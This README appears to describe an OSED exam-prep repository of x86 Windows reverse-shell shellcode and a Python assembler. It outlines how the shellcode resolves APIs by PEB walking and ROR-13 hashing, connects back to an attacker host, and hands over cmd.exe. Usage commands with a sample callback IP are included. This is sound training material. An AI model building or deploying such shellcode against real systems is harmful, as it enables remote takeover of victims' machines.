# redshell

x86 Windows shellcode development environment for OSED (EXP-301).

## Contents

- `revshell.asm` — position-independent reverse shell shellcode for x86 Windows
- `assembler.py` — Keystone-based assembler with bad char checking and runtime substitution

## Requirements

```bash
pip install keystone-engine
```

## Usage

```bash
# Assemble with LHOST/LPORT
python3 assembler.py revshell.asm -i 192.168.45.227 -p 443

# Bad character check
python3 assembler.py revshell.asm -i 192.168.45.227 -p 443 -b "\x00\x0a\x0d"

# Size limit check
python3 assembler.py revshell.asm -i 192.168.45.227 -p 443 -m 400
```

Output is exploit-ready Python bytes, 16 bytes per line.

## revshell.asm

Staged-free reverse shell that:

1. Walks the PEB module list to resolve `kernel32.dll` without API calls
2. Uses ROR-13 hashing to resolve `TerminateProcess`, `LoadLibraryA`, `CreateProcessA`
3. Loads `ws2_32.dll` and resolves `WSAStartup`, `WSASocketA`, `WSAConnect`
4. Connects back to LHOST:LPORT
5. Spawns `cmd.exe` with stdin/stdout/stderr redirected to the socket
6. Calls `TerminateProcess` to cleanly exit the parent process

**No null bytes. 357 bytes.**

## assembler.py

| Flag | Description |
|------|-------------|
| `-i IP` | LHOST — substitutes `LHOST_DWORD` in the asm |
| `-p PORT` | LPORT — substitutes `LPORT_WORD` in the asm |
| `-b CHARS` | Bad character list in msfvenom format. `\x00` always checked. |
| `-m BYTES` | Warn if shellcode exceeds this size |

Function name hashes are computed automatically at assemble time — use
`HASH_FuncName` anywhere in the asm and it will be replaced with the
correct ROR-13 hash.
